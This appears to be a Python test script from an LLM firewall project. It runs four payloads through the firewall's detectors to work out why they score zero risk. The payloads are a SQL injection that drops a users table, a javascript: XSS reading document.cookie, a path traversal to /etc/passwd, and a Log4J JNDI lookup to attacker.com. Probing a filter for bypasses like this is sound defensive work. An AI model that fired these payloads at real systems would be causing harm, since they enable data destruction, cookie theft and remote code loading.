#!/usr/bin/env python3
"""
ANALYZE BYPASSES - WARUM risk=0.00?
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from tests_firewall.test_ultra_break_v4_dos import run_detectors_timed
from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
from llm_firewall.preprocess.context import classify_context

bypasses = [
    ("SQL", "' OR '1'='1'; DROP TABLE users--"),
    ("XSS", "javascript:alert(document.cookie)"),
    ("Path", "../../../etc/passwd"),
    ("Log4J", "${jndi:ldap://attacker.com/exploit}"),
]

print("="*70)
print("BYPASS ANALYSIS - DETAILLIERT")
print("="*70)

for category, payload in bypasses:
    print(f"\n{'='*70}")
    print(f"CATEGORY: {category}")
    print(f"PAYLOAD: {payload}")
    print(f"{'='*70}")
    
    hits, elapsed = run_detectors_timed(payload)
    ctx = classify_context(payload)
    action, risk, contrib = decide_action_otb(hits, ctx, text=payload)
    
    print(f"Context: {ctx['context']}")
    print(f"Is Documentation: {ctx.get('is_documentation', False)}")
    print(f"Hits ({len(hits)}): {hits}")
    print(f"Risk: {risk:.3f}")
    print(f"Action: {action}")
    print(f"Contributions: {list(contrib.keys())[:10]}")
    
    # Erwartete Detections
    expected = {
        "SQL": ["secret_patterns", "DROP", "TABLE", "admin"],
        "XSS": ["javascript", "alert", "script"],
        "Path": ["../", "etc/passwd", "path_traversal"],
        "Log4J": ["jndi", "ldap", "${"]
    }
    
    missing = [e for e in expected.get(category, []) if not any(e.lower() in h.lower() for h in hits)]
    if missing:
        print(f"MISSING DETECTIONS: {missing}")

